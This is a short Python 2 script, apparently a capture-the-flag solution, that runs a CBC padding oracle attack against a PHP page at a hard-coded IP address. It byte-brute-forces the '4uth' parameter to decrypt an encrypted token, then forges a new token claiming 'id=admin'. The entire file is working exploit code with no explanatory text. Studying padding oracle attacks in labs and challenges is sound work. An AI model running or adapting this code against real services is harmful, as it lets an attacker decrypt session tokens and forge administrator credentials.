import urllib2

offset=7
block=0
iv = [[0x18,0xD1,0x37,0x8A,0x40,0xA1,0x68,0x5F],[0x07,0x5d,0x85,0x08,0x1e,0x75,0x84,0xa7],[0x45,0x13,0x89,0x6d,0x48,0xb4,0x62,0x03],[0x5a,0x95,0x26,0x8d,0x1f,0x6c,0x99,0xb2]]
enctxt = ['075d85081e7584a7','4513896d48b46203','5a95268d1f6c99b2','36cb3cef3ad61670']
plaintxt=''
pTxtIndex=0
gen_pTxt='lv=1|id=admin|name=Guest;'
imv = []

pad_c = 8-len(gen_pTxt)%8
gen_pTxt=gen_pTxt+(chr(pad_c)*pad_c)
gen_encTxt='36cb3cef3ad61670'

while block != 4:
	i=[0,0,0,0,0,0,0,0]
	mv = [0,0,0,0,0,0,0,0]
	while i[offset]!=256:
		opener = urllib2.build_opener()
		url = 'http://210.124.110.197/4_6810b710499a28b7e50dcb1f3e86654a3e6a1cf98ba86f1f5bdcf407ea7498d/__w400_usrpage.php?4uth=%02x%02x%02x%02x%02x%02x%02x%02x'% (i[0],i[1],i[2],i[3],i[4],i[5],i[6],i[7]) + enctxt[block]
		html = opener.open(url).read()
		if html[:4] != '<scr':
			print url[43:]
			mv[offset] = i[offset] ^ (8-offset)
			print mv
			if offset != 0:
				for j in range(offset,8):
					i[j]=mv[j] ^ (9-offset)
				offset-=1
			else:
				break
		i[offset]+=1
	for i in range(8):
		plaintxt += chr(iv[block][i]^mv[i])
	imv.append(mv)
	block+=1
	offset=7

block=3
mv = [97, 146, 33, 138, 24, 107, 158, 181]
while block !=-2:
	temp = ''
	for i in range(8):
		if block != -1:
			temp += '%02x' % (mv[i] ^ ord(gen_pTxt[(block*8)+i]))
		else:
			temp += '%02x' % (mv[i])
	gen_encTxt = temp + gen_encTxt

	if block==0:
		print "plain Text : " + plaintxt
		print "Generated Key : " + gen_encTxt
		break
	mv=[0,0,0,0,0,0,0,0]
	i=[0,0,0,0,0,0,0,0]
	while i[offset]!=256:
		opener = urllib2.build_opener()
		url = 'http://210.124.110.197/4_6810b710499a28b7e50dcb1f3e86654a3e6a1cf98ba86f1f5bdcf407ea7498d/__w400_usrpage.php?4uth=%02x%02x%02x%02x%02x%02x%02x%02x'% (i[0],i[1],i[2],i[3],i[4],i[5],i[6],i[7]) + temp
		html = opener.open(url).read()
		if html[:4] != '<scr':
			print url[43:]
			mv[offset] = i[offset] ^ (8-offset)
			print mv
			if offset != 0:
				for j in range(offset,8):
					i[j]=mv[j] ^ (9-offset)
				offset-=1
			else:
				break
		i[offset]+=1
	
	block-=1
	offset=7